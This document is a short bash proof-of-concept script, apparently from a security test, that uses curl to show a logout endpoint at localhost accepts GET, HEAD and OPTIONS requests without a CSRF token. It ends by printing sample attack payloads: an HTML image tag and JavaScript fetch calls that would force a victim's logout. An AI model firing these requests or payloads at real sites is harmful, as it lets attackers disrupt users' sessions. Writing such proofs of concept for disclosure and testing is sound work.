#!/bin/bash

# POC: HEAD and OPTIONS Method CSRF Bypass on Logout
# This script demonstrates that HEAD and OPTIONS HTTP methods
# bypass CSRF protection on the logout endpoint

TARGET="http://localhost:8000"
LOGOUT_ENDPOINT="${TARGET}/accounts/logout/"

echo "=== HEAD and OPTIONS Method CSRF Bypass POC ==="
echo ""
echo "Target: $LOGOUT_ENDPOINT"
echo ""

# Test 1: GET method (baseline - known to bypass CSRF)
echo "[1] GET /accounts/logout/ (baseline - bypasses CSRF)"
curl -s -w "HTTP Status: %{http_code}\n" -X GET "$LOGOUT_ENDPOINT"
echo ""

# Test 2: HEAD method (also bypasses CSRF)
echo "[2] HEAD /accounts/logout/ (also bypasses CSRF)"
curl -s -w "HTTP Status: %{http_code}\n" -X HEAD "$LOGOUT_ENDPOINT"
echo ""

# Test 3: OPTIONS method (also bypasses CSRF)
echo "[3] OPTIONS /accounts/logout/ (also bypasses CSRF)"
curl -s -w "HTTP Status: %{http_code}\n" -X OPTIONS "$LOGOUT_ENDPOINT"
echo ""

# Test 4: POST method (for comparison - requires CSRF)
echo "[4] POST /accounts/logout/ (requires CSRF token - will fail)"
curl -s -w "HTTP Status: %{http_code}\n" -X POST "$LOGOUT_ENDPOINT" 2>&1 | head -n 1
echo ""

echo "=== ANALYSIS ==="
echo "✗ VULNERABLE: GET, HEAD, and OPTIONS methods allow logout without CSRF token"
echo "✓ PROTECTED: POST method requires valid CSRF token (HTTP 403 without it)"
echo ""
echo "This allows attackers to force user logout via CSRF attack using:"
echo "  - Simple HTML image tag: <img src='http://target/accounts/logout/'>"
echo "  - JavaScript HEAD request: fetch(url, {method: 'HEAD'})"
echo "  - JavaScript OPTIONS request: fetch(url, {method: 'OPTIONS'})"
